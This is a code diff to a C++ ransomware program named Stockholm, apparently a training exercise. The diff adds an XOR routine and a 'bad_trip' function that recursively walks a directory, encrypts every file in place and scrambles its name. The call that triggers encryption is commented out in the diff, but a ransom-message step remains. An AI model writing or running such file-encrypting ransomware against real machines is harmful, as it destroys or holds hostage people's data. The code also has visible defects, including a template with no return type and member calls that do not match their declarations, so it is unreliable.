@@ -8,6 +8,12 @@
 #include <string.h> 
 #include <sys/stat.h>
 
+template<typename T> xor_algo(T &data, size_t data_len, const char *key, size_t key_len) {
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
+
 class data {
     std::string message;
     char key[28];
@@ -72,12 +78,36 @@ void Stockholm::leave_message(data *d){
 }
 
 void Stockholm::bad_trip(std::string &path, data *info){
+    DIR *dir = opendir(path.c_str());
+    if (dir == NULL) {
+        return;
+    }
+    struct dirent *entry;
+    while((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            std::string full_path = path + "/" + entry->d_name;
+            struct stat path_stat;
+            stat(full_path.c_str(), &path_stat);
+            if (S_ISDIR(path_stat.st_mode)) {
+                bad_trip(full_path, info);
+            } else {
+                encrypt_xor(full_path, info);
+                std::string encrypted_name = entry->d_name;
+                xor_algo(encrypted_name, encrypted_name.size(), info->key.c_str(), info->key_size);
+                std::string new_full_path = path + "/" + encrypted_name;
+                if (rename(full_path.c_str(), new_full_path.c_str()) != 0) {
+                    perror("Failed to rename file");
+                }
+                std::cout << path << std::endl;
+            }
+        }
+    }
 
 }
 
 void Stockholm::ransome_ware(data *d){
     generate_key(d->key, d->key_size);
-    bad_trip(d->path, d);
+    // bad_trip(d->path, d);
     leave_message(d);
 
 }
